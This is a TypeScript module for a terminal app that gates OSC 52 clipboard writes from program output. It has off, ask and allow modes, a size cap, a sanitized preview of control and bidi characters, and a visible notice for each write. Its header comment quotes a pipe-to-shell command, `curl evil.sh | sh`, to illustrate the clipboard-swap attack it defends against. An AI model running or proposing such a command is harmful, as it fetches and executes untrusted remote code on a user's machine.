// The gate in front of OSC 52 clipboard stores.
//
// Any program's output can carry `ESC ] 52 ; c ; <base64> BEL`: a `cat` of a
// hostile file, a curl response, text an agent echoes. Honoured blindly, it
// swaps what the user copied for something they will then paste (`curl
// evil.sh | sh`). The Rust pump therefore never writes the clipboard on its
// own; it forwards `term://clipboard` and this gate decides, per the
// `clipboardWrites` setting:
//
//   off    drop silently (debug log)
//   ask    the first store from a terminal asks; the answer (allow/deny) is
//          remembered for that terminal until it closes. One prompt per
//          terminal at a time — stores arriving while it is open are DROPPED,
//          never queued: replaying them later would apply text the user never
//          saw.
//   allow  apply
//
// Every mode caps the payload, and every write that actually lands shows a
// brief notice, so a clipboard change is never invisible.
//
// The gate lives in the frontend because it is the only layer that can put a
// confirm in front of the user and that knows which rail row a terminal is.

import type { ClipboardWritesMode } from "./ipc";

/** Largest store applied, in decoded UTF-8 bytes. Mirrors the Rust pump's
 *  cap (`OSC52_MAX_BYTES`), which drops anything larger before it reaches the
 *  event bus; this is the same rule for any path that bypasses it. */
export const CLIPBOARD_MAX_BYTES = 100 * 1024;

/** How much of the text the confirm shows. */
export const PREVIEW_CHARS = 80;

/** UTF-8 byte length without allocating when the answer is obvious. */
export function utf8Length(text: string): number {
  // Every UTF-16 unit encodes to at most 3 bytes.
  if (text.length * 3 <= CLIPBOARD_MAX_BYTES) return text.length;
  return new TextEncoder().encode(text).length;
}

/** One code point made visible: C0/DEL as their Control Pictures glyph, C1
 *  and the bidi/zero-width formatting characters as `\u{…}` — those can make
 *  a preview read differently from what would be pasted. */
function visible(cp: number): string {
  if (cp < 0x20) return String.fromCodePoint(0x2400 + cp);
  if (cp === 0x7f) return "␡";
  if (
    (cp >= 0x80 && cp <= 0x9f) ||
    (cp >= 0x200b && cp <= 0x200f) ||
    (cp >= 0x202a && cp <= 0x202e) ||
    (cp >= 0x2066 && cp <= 0x2069) ||
    cp === 0xfeff
  ) {
    return `\\u{${cp.toString(16)}}`;
  }
  return String.fromCodePoint(cp);
}

/** The confirm's preview: the first `max` characters with control characters
 *  made visible, and an ellipsis when the text runs on. */
export function previewText(text: string, max = PREVIEW_CHARS): string {
  let out = "";
  let n = 0;
  for (const ch of text) {
    if (n === max) return `${out}…`;
    out += visible(ch.codePointAt(0)!);
    n++;
  }
  return out;
}

export interface ClipboardGateDeps {
  /** The live `clipboardWrites` setting. */
  mode(): ClipboardWritesMode;
  /** Ask the user. `label` names the terminal, `preview` is already
   *  sanitized, `chars` is the full length. Resolves true to allow. */
  confirm(label: string, preview: string, chars: number): Promise<boolean>;
  /** Put the text on the OS clipboard. */
  write(text: string): Promise<void>;
  /** The brief non-blocking "<label> set the clipboard" notice. */
  notice(message: string): void;
  /** Debug logging; defaults to console.debug. */
  log?(message: string): void;
}

/** What one store came to. */
export type ClipboardOutcome = "applied" | "dropped";

export class ClipboardGate {
  private readonly decisions = new Map<number, "allowed" | "denied">();
  /** Terminals with a confirm on screen, keyed to a token so a terminal that
   *  closed (and whose id may be recycled) mid-prompt does not inherit the
   *  answer. */
  private readonly prompting = new Map<number, object>();
  private readonly log: (message: string) => void;

  constructor(private readonly deps: ClipboardGateDeps) {
    this.log = deps.log ?? ((m) => console.debug(m));
  }

  /** Handle one OSC 52 store from terminal `termId`, labelled `label`. */
  async handle(termId: number, label: string, text: string): Promise<ClipboardOutcome> {
    const bytes = utf8Length(text);
    if (bytes > CLIPBOARD_MAX_BYTES) {
      this.log(`[clipboard] ${label}: dropped a ${bytes}-byte write (cap ${CLIPBOARD_MAX_BYTES})`);
      return "dropped";
    }
    const mode = this.deps.mode();
    if (mode === "off") {
      this.log(`[clipboard] ${label}: write dropped (clipboard writes are off)`);
      return "dropped";
    }
    if (mode === "allow") return this.apply(label, text);

    const decision = this.decisions.get(termId);
    if (decision === "allowed") return this.apply(label, text);
    if (decision === "denied") {
      this.log(`[clipboard] ${label}: write dropped (denied for this terminal)`);
      return "dropped";
    }
    if (this.prompting.has(termId)) {
      this.log(`[clipboard] ${label}: write dropped (a prompt is already open)`);
      return "dropped";
    }

    const token = {};
    this.prompting.set(termId, token);
    let allowed = false;
    try {
      allowed = await this.deps.confirm(label, previewText(text), [...text].length);
    } catch {
      allowed = false;
    }
    const stillOurs = this.prompting.get(termId) === token;
    if (stillOurs) {
      this.prompting.delete(termId);
      this.decisions.set(termId, allowed ? "allowed" : "denied");
    }
    if (!allowed) {
      this.log(`[clipboard] ${label}: write denied`);
      return "dropped";
    }
    // The setting may have been switched off while the prompt was open.
    if (this.deps.mode() === "off") return "dropped";
    return this.apply(label, text);
  }

  /** The terminal closed: forget its answer (ids can be recycled). */
  forget(termId: number): void {
    this.decisions.delete(termId);
    this.prompting.delete(termId);
  }

  private async apply(label: string, text: string): Promise<ClipboardOutcome> {
    try {
      await this.deps.write(text);
    } catch (e) {
      this.log(`[clipboard] ${label}: write failed: ${String(e)}`);
      return "dropped";
    }
    this.deps.notice(`${label} set the clipboard`);
    return "applied";
  }
}
